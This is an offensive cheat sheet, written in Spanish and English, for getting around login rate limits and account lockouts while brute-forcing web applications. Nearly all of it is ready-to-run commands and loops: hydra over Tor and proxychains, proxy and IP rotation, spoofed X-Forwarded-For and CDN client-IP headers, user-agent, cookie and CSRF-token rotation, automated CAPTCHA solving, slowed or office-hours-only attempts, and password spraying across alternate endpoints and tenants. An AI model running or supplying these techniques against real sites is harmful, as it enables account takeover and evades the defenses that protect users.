---
aliases:
  - Rate Limit Bypass
  - IP Rotation
  - X-Forwarded-For Spoof
  - Lockout Evasion
tags:
  - type/cheatsheet
  - vuln/brute-force
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[HTTP Brute Forcing]]"
---
# HTTP Brute Forcing - Bypass de Rate-Limit

***

## IP Rotation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `proxychains -q hydra -L users.txt -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | Hydra via proxychains (Tor) | Free, slow exit nodes. |
| `sudo systemctl start tor && proxychains -q curl https://target/` | Tor SOCKS5 setup | Free anonymizer. |
| `for proxy in $(cat proxies.txt); do curl --proxy "$proxy" -X POST -d "user=admin&pass=$PASS" https://target/login; done` | Rotate paid proxies per request | $$. |
| `curl --socks5 127.0.0.1:9050 -X POST -d "..." https://target/login` | SOCKS5 direct | Tor connection. |
| AWS Lambda invokes con rotating regions: deploy con `serverless deploy --region us-east-1` etc, each invoke distinct IP | Free tier IP rotation | Custom infra. |
| Cloudflare Workers: deploy script con `wrangler publish` y trigger via Worker URL | Each request = CF edge IP | CF abuse. |
| `for i in {1..255}; do (curl --proxy "http://proxy${i}.target:8080" ... &); done; wait` | Bulk parallel via proxy pool | Volume. |
| `httpx -l urls.txt -proxy http://$(shuf -n 1 proxies.txt)` | httpx con random proxy | Bulk recon. |
| `wireguard-tools rotate` (custom script) | VPN per-request rotation | Slow but reliable. |
^bf-bypass-iprotation

### ProxyChains setup

```bash
# /etc/proxychains.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 9050    # Tor
http   1.2.3.4 8080
http   5.6.7.8 8080

# Run hydra
proxychains -q hydra -L users.txt -P pass.txt target.com http-post-form ...
```

___

## Header Spoofing (X-Forwarded-For etc)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for ip in 1.1.1.1 8.8.8.8 9.9.9.9 ...; do curl -H "X-Forwarded-For: $ip" -d "user=admin&pass=$PASS" https://target/login; done` | XFF rotation per-attempt | Server trust XFF. |
| `curl -H "X-Forwarded-For: $(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1)" ...` | Random IP per request | Per-IP counter bypass. |
| `curl -H "X-Real-IP: 1.2.3.4" -d "..." https://target/login` | nginx-style IP spoof | nginx-fronted. |
| `curl -H "True-Client-IP: 127.0.0.1" -d "..." https://target/login` | Akamai-style | CDN-fronted. |
| `curl -H "Cf-Connecting-IP: 1.2.3.4" -d "..." https://target/login` | Cloudflare-specific | CF behind WAF. |
| `curl -H "X-Forwarded-For: 127.0.0.1" -d "..." https://target/login` | Internal IP whitelisted | Trust bypass. |
| `curl -H "X-Forwarded-For: 1.2.3.4, 5.6.7.8" ...` | Chain XFF — first/last wins differential | Parser differential. |
| `curl -H "Forwarded: for=1.2.3.4" ...` | RFC 7239 syntax | Modern apps. |
| `for h in 'X-Forwarded-For' 'X-Real-IP' 'X-Originating-IP' 'X-Client-IP' 'True-Client-IP' 'Cf-Connecting-IP' 'Fastly-Client-IP'; do curl -H "$h: $(shuf -i 1-255 -n 1)" -d "..." https://target/login; done` | Bulk header rotation | Multi-header. |
| Burp Intruder con header position + IP wordlist | UI-driven rotation | GUI approach. |
^bf-bypass-headerspoof

### Burp Intruder XFF rotation

```bash
# Bash curl-loop variant
for i in {1..255}; do
  for j in {1..255}; do
    curl -s -X POST https://target/login \
      -H "X-Forwarded-For: 1.$i.$j.$RANDOM" \
      -d "user=admin&pass=$PASS"
  done
done
```

___

## User-Agent + Session Rotation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for ua in 'Mozilla/5.0 Chrome' 'curl/7.81' 'PostmanRuntime/7.32'; do curl -A "$ua" -d "..." https://target/login; done` | UA rotation per-request | Per-UA fingerprint detection. |
| `curl -A "$(shuf -n 1 user-agents.txt)" -d "..." https://target/login` | Random UA from wordlist | Bulk. |
| `for i in {1..N}; do curl --cookie-jar /tmp/c$i -c /tmp/c$i -X POST -d "..." https://target/login; done` (jar per attempt) | Fresh cookie jar per attempt | Session-bound counter. |
| `TOKEN=$(curl -s https://target/login \| grep -oE 'csrf_token[^"]+"[^"]+"' \| head -1); curl -X POST -d "csrf=$TOKEN&user=...&pass=..." https://target/login` | Pre-fetch fresh CSRF token | Token-bound counter. |
| `docker run --rm lwthiker/curl-impersonate:0.5-chrome curl_chrome116 https://target/login -d "..."` | TLS fingerprint impersonate Chrome | Anti-bot JA3. |
| `for h in "Accept-Language: en-US" "Accept-Language: es-ES" "Accept-Language: ja-JP"; do curl -H "$h" ...; done` | Locale rotation | Locale-based fingerprint. |
| 2captcha API: `python3 -c "from anticaptchaofficial.recaptchav2proxyless import *; ..."` | Auto-solve CAPTCHA | CAPTCHA-protected. |
| `curl -A "Mozilla/5.0 (iPhone; ...)" -d "..." https://m.target.com/login` (mobile endpoint) | Mobile UA + endpoint | Mobile less restrictive. |
| `for r in https://google.com https://target.com/home https://target.com/about; do curl -H "Referer: $r" -d "..." https://target/login; done` | Referer rotation | Referer fingerprint. |
^bf-bypass-uasession

___

## Timing Distribution

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for p in $(cat passwords.txt); do curl -d "user=admin&pass=$p" https://target/login; sleep $((RANDOM % 60 + 30)); done` | Random 30-90s delay | Avoid burst detection. |
| `hydra -L users.txt -P pass.txt -t 1 -W 5 ...` (1 thread, 5s wait between) | Hydra slow throttle | Lockout-aware. |
| `for u in $(cat users.txt); do curl -d "user=$u&pass=Spring2025!" https://target/login; sleep 60; done` (1 user/min) | Time-distributed spray | Anti-lockout. |
| Cron-style: 1 attempt cada 30 min via `* * * * *` con jitter | Slow brute over days | Hide en legit traffic. |
| `if [ "$(date +%H)" -ge 9 ] && [ "$(date +%H)" -le 17 ]; then curl ...; fi` | Office hours only | Match legit pattern. |
| Bash exponential backoff: `delay=1; while ...; do sleep $delay; delay=$((delay*2)); done` | Backoff on 429 response | Smart pacing. |
| Burp Repeater group "Send in single connection" (HTTP/2 single packet) | Race condition burst window | Race-based bypass. |
| `for i in {1..10}; do (curl -d "user=admin&pass=$PASS_$i" https://target/login &); done; wait; sleep 600` | Burst N + sleep 10min | Reset counter window. |
^bf-bypass-timing

___

## Endpoint / Account Rotation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for ep in /login /api/login /oauth/token /sessions /api/v1/login /api/v2/login; do curl -X POST -d "user=admin&pass=$PASS" https://target$ep; done` | Probe multiple login endpoints | Per-endpoint counter. |
| `curl -X POST -d "user=admin&pass=$PASS" https://m.target.com/login` (mobile endpoint) | Mobile separate stack | Counter per host. |
| `curl -X POST -d "grant_type=password&username=admin&password=$PASS&client_id=APP" https://target/oauth/token` | OAuth password grant alternative | Often less limited. |
| `curl -X POST -d "user=admin&pass=$PASS" https://internal-auth.target.com/login` | Internal API exposed externally | Misconfig. |
| `for u in $(cat 1000_users.txt); do curl -d "user=$u&pass=Spring2025!" https://target/login; sleep 1; done` | Reverse spray (1 pass × N users) | No per-user lockout. |
| `for u in $(cat users.txt); do for p in pass1 pass2 pass3; do curl -d "user=$u&pass=$p" https://target/login; done; done` | Spray cycling | Slow + stealth. |
| `curl -X POST -H "Content-Type: application/json" -d '{"query":"mutation{login(u:\"admin\",p:\"$PASS\"){token}}"}' https://target/graphql` | GraphQL login mutation alternative | Different code path. |
| `wscat -c wss://target/auth -H "Cookie: ..."` (WebSocket auth) | WS auth often uncounted | Real-time path. |
| `for i in {1..100}; do curl -d "user=admin&pass=Spring2025!" https://customer${i}.target.com/login; done` | Per-tenant SaaS endpoints | Multitenancy. |
^bf-bypass-endpoints

### Reverse spray (anti-lockout)

```bash
USERS=$(cat 1000_users.txt)

for pass in "Password2025!" "Welcome1!" "Spring2025"; do
  for user in $USERS; do
    curl -s -X POST https://target/login \
      -d "username=$user&password=$pass" \
      -o /dev/null -w "%{http_code} $user $pass\n"
    sleep 1  # 1/sec evita IP-level
  done
  sleep 3600  # 1h between password rounds
done
```

***
